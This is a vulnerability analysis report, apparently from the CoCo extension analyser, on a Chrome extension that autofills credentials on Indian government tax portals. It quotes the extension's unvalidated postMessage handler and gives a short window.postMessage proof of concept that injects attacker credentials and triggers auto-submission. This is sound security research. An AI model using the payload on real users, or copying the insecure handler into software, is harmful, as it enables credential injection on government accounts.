# CoCo Analysis: nefjpldapjabadknlokgikpaeaggacng

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 7 (5 JQ_obj_val_sink + 2 chrome_storage_local_set_sink)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink → JQ_obj_val_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nefjpldapjabadknlokgikpaeaggacng/opgen_generated_files/cs_0.js
Line 470 (window.addEventListener)
Line 475 (event.data)
Line 495-496 (chrome.storage.local.set)
Line 528, 572, 591, 599, 604 (jQuery .val() sinks)

**Code:**

```javascript
// Content script - Entry point
window.addEventListener("message", function (event) {
    if (event.source != window)
        return;

    var data = JSON.parse(event.data); // ← attacker-controlled
    if (data.type && (data.type == "PAGE_TO_CSCRIPT")) {
        setupCredentials(data); // ← passes attacker data
    }
}, false);

function setupCredentials(data) {
    if (data.sc == 'ITAX')
        var forward_url = "https://eportal.incometax.gov.in/iec/foservices/#/login";
    if (data.sc == 'GST')
        var forward_url = "https://services.gst.gov.in/services/login";
    if (data.sc == 'PTAX')
        var forward_url = "https://egov.wbcomtax.gov.in/PT_Enrollment/loginAction.do?parameter=doForwardLogin";

    openNewTab(data, forward_url);
}

function openNewTab(data, url) {
    // Storage write - attacker-controlled credentials
    chrome.storage.local.set({"un": data.un}, function() {}); // ← attacker controls
    chrome.storage.local.set({"pw": data.pw}, function() {}); // ← attacker controls

    chrome.runtime.sendMessage({
        type: "newtab", options: {
            url: url,
            un: data.un,
            pw: data.pw,
            id: data.id
        }
    });
}

// Storage read and auto-fill - Income Tax portal
var _el_itax_un = $("#panAdhaarUserId");
if (_el_itax_un) {
    chrome.storage.local.get(['un'], function(result) {
        $(_el_itax_un).val(result.un); // ← JQ_obj_val_sink - attacker data injected into form
    });
}

// GST portal
var _el_gst_un = $("#username");
var _el_gst_pw = $("#user_pass");
if (_el_gst_un) {
    chrome.storage.local.get(['un'], function(result) {
        _el_gst_un.val(result.un); // ← JQ_obj_val_sink
    });
}
if (_el_gst_pw) {
    chrome.storage.local.get(['pw'], function(result) {
        $(_el_gst_pw).val(result.pw); // ← JQ_obj_val_sink
        $('input [type="submit"]').trigger("click"); // Auto-submits with attacker credentials!
    });
}

// Profession Tax portal
var _el_ptax_un = $("#login");
var _el_ptax_pw = $("#txtPassword");
if (_el_ptax_un) {
    chrome.storage.local.get(['un'], function(result) {
        $(_el_ptax_un).val(result.un); // ← JQ_obj_val_sink
    });
}
if (_el_ptax_pw) {
    chrome.storage.local.get(['un'], function(result) {
        $(_el_ptax_pw).val(result.un); // ← JQ_obj_val_sink
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM injection)

**Attack:**

```javascript
// On any webpage where the extension's content script runs:
window.postMessage(JSON.stringify({
    type: "PAGE_TO_CSCRIPT",
    sc: "GST",
    un: "attacker_username",
    pw: "attacker_password",
    id: "123"
}), "*");

// The extension will:
// 1. Store the attacker's credentials in chrome.storage.local
// 2. Navigate to https://services.gst.gov.in/services/login
// 3. Auto-fill the login form with attacker credentials
// 4. Auto-submit the form (line 592)
```

**Impact:** Credential injection attack. A malicious webpage can inject arbitrary credentials into government tax portal login forms (Income Tax, GST, Profession Tax portals). The extension auto-fills and even auto-submits forms with attacker-controlled credentials, potentially enabling phishing attacks, credential harvesting, or unauthorized account access if the attacker can social engineer users to use these injected credentials.

---

## Additional Notes:

The extension operates on `<all_urls>` (all websites), so any malicious webpage can exploit this vulnerability. The `externally_connectable` manifest restriction does not apply to `window.postMessage` listeners in content scripts - as per the methodology, we IGNORE manifest restrictions for message passing.
